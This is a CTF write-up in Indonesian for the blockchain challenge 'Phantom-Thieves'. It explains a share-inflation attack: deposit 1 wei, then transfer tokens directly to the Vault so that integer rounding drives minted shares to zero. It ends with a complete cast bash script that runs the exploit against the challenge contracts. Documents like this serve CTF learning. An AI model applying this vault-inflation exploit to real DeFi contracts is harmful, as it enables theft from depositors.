**Chall: Phantom-Thieves (Blockchain)**

![screenshot](/blog/ctf-compfest17-ui/img-07.png)

Skenario:

Pertama-tama saya memahami dulu kondisi isSolved(). Dalam tantangan ini,  
fungsi isSolved() ada di dalam kontrak Setup.sol. Didalam kode Setup.sol,  
tujuannya menjadi jelas. Pertama harus memanipulasi state kontrak sedemikian  
rupa sehingga ketika openVault() di panggil, eksekusinya gagal(revert) dengan  
error noShares().


Error NoShares() hanya ada di satu tempat, yaitu di dalam fungsi openVault()  
pada kontrak Fortress.sol.


wouldMint akan menjadi 0 jika (depositAmount \* currentShares) lebih kecil dari  
currentBalance. Karena solidity menggunakan pembagian integer yang  
membulatkan ke bawah, setiap hasil pembagian yang kurang dari 1 akan  
menjadi 0.

- depositAmount: Nilai ini tetap (0.5 ether)

- currentShares: Total shares di dalam Vault

- currentBalance: Total token PHTM yang dimiliki oleh kontrak Vault

Kerentanan muncul dari asumsi yang salah dalam perhitungan ini. Kontrak Vault  
mengasumsikan bahwa currentBalance hanya akan bertambah melalui fungsi  
deposit(), yang secara proporsional juga akan menambah totalShares.


Namun, tidak ada yang bisa menghentikan untuk mengirim token langsung ke  
alamat Vault menggunakan fungsi transfer() pada kontrak token. Jika melakukan  
ini, currentBalance akan meningkat drastis sementara totalShares tetap tidak  
berubah. Ini akan menginflate nilai dari setiap share yang merusak rasio yang  
digunakan dalam perhitungan.

**Exploitasi**

1. Beli sejumlah token PHTM agar kita memiliki modal untuk serangan
2. Lakukan deposit dengan jumlah yang sangat kecil (misalnya 1 wei). Ini adalah  
langkah krusial untuk membuat totalShares menjadi lebih dari nol, sehingga  
logika perhitungan wouldMint tidak jatuh ke kasus pertama (currentShares  
== 0). Setelah langkah ini, totalShares akan menjadi 1 dan currentBalance  
juga 1.
3. Transfer sisa token kita langsung ke alamat kontrak Vault. Langkah ini akan  
membuat currentBalance melonjak tinggi, misalnya menjadi 1 ether.
4. Ketika isSolved() mensimulasikan panggilan openVault(), perhitungan  
wouldMint akan menjadi:
   - wouldMint = (0.5 ether \* 1) / 1 ether
   - wouldMint = 0.5
   - Karena pembagian integer, hasilnya dibulatkan ke bawah menjadi 0
   - Kondisi if (wouldMint == 0) akan terpenuhi, dan kontrak akan revert  
dengan NoShares()

Scriptnya:

```bash
export RPC_URL="isi rpc url"
export PRIVKEY="isi private key"
export SETUP_CONTRACT_ADDR="isi setup contract address"
export FORTRESS_ADDR=$(cast call $SETUP_CONTRACT_ADDR "challenge()" --rpc-url $RPC_URL | awk '{print "0x" substr($0, 27)}')
export TOKEN_ADDR=$(cast call $FORTRESS_ADDR "token()" --rpc-url $RPC_URL | awk '{print "0x" substr($0, 27)}')
export VAULT_ADDR=$(cast call $FORTRESS_ADDR "vault()" --rpc-url $RPC_URL | awk '{print "0x" substr($0, 27)}')
echo "Fortress Address: $FORTRESS_ADDR"
echo "Token Address: $TOKEN_ADDR"
echo "Vault Address: $VAULT_ADDR"
cast send $TOKEN_ADDR "buyTokens()" --value 1ether --private-key $PRIVKEY --rpc-url $RPC_URL –legacy
cast send $TOKEN_ADDR "approve(address,uint256)" $VAULT_ADDR 1 --private-key $PRIVKEY --rpc-url $RPC_URL –legacy
cast send $VAULT_ADDR "deposit(uint256)" 1 --private-key $PRIVKEY --rpc-url $RPC_URL –legacy
TOKEN_TO_DONATE=$((1000000000000000000 - 1))
cast send $TOKEN_ADDR "transfer(address,uint256)" $VAULT_ADDR $TOKEN_TO_DONATE --private-key $PRIVKEY --rpc-url $RPC_URL –legacy
```
Sesudah script dijalankan, kembali ke link yang ada di deskripsi dan click button  
flag untuk mendapatkan flag
